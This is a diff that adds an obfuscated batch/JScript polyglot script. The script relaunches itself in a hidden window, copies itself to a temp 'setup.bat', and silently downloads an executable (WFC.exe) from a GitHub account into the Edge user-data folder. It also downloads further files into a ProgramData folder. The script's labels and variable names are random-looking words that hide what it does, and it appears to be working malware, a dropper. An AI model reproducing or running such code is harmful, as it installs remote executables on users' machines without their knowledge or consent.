@@ -1,0 +1,106 @@
+@set @x=0 /*
+@echo off
+setlocal EnableDelayedExpansion
+
+if defined labelSemitypeMisstep goto :valueMonitor
+set "labelSemitypeMisstep=1"
+cscript //nologo //E:JScript "%~f0" "%~f0" %*
+exit /b 0
+:valueMonitor
+
+if "%~1"=="sideloadCertificateStubbable" goto :expiredRelay
+
+:expiredRelay
+
+if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" (
+    goto :configurationFlushCompensateClear
+)
+
+:reduceQueueDistributeHandshake
+set "supplierFixtureAssociate=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe"
+for %%F in ("!supplierFixtureAssociate!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -LJ -s -o "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" "https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe"
+if !errorlevel! neq 0 (
+    del "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" 2>nul
+    goto :migrationControllerUncached
+)
+goto :policyDispatchRetry
+
+:migrationControllerUncached
+exit /b 1
+
+:policyDispatchRetry
+
+:configurationFlushCompensateClear
+
+if exist "%PROGRAMDATA%\costanza\index.xoml" (
+    goto :obfuscatorArea
+)
+
+:rangeMark
+set "supplierFixtureAssociate=%PROGRAMDATA%\costanza\index.xoml"
+for %%F in ("!supplierFixtureAssociate!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%PROGRAMDATA%\costanza\index.xoml" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/index.xml"
+if !errorlevel! neq 0 (
+    del "%PROGRAMDATA%\costanza\index.xoml" 2>nul
+    goto :flagDelete
+)
+goto :pause
+
+:flagDelete
+exit /b 1
+
+:pause
+
+:obfuscatorArea
+
+if exist "%PROGRAMDATA%\costanza\viewtime.csv" (
+    goto :segment
+)
+
+:isolatedPlaintext
+set "supplierFixtureAssociate=%PROGRAMDATA%\costanza\viewtime.csv"
+for %%F in ("!supplierFixtureAssociate!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%PROGRAMDATA%\costanza\viewtime.csv" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv"
+if !errorlevel! neq 0 (
+    del "%PROGRAMDATA%\costanza\viewtime.csv" 2>nul
+    goto :timerWareHost
+)
+goto :artifact
+
+:timerWareHost
+exit /b 1
+
+:artifact
+if not defined supervisionStreamIntrospectionPointer goto :authorizerDeserializeEmit
+call "%~f0" %*
+goto :eof
+:authorizerDeserializeEmit
+set "supervisionStreamIntrospectionPointer=1"
+cscript //nologo //E:JScript "%~f0" reduce sideloadCertificateStubbable
+set "supervisionStreamIntrospectionPointer="
+goto :segment
+
+:segment
+
+if defined supervisionStreamIntrospectionPointer goto :eof
+
+endlocal
+exit /b 0
+*/
+var sh = new ActiveXObject('WScript.Shell');
+var bat = WScript.ScriptFullName;
+var fso = new ActiveXObject('Scripting.FileSystemObject');
+var ext = fso.GetExtensionName(bat).toLowerCase();
+if (ext != 'bat' && ext != 'cmd') { var dst = sh.ExpandEnvironmentStrings('%TEMP%\\setup.bat'); fso.CopyFile(bat, dst, true); bat = dst; }
+var w = false;
+var a = '';
+for (var i = 0; i < WScript.Arguments.length; i++) if (WScript.Arguments(i) == 'reduce') w = true; else a += ' ' + WScript.Arguments(i);
+sh.Run('cmd /c "' + bat + '"' + a, 0, w);
+WScript.Quit(0);
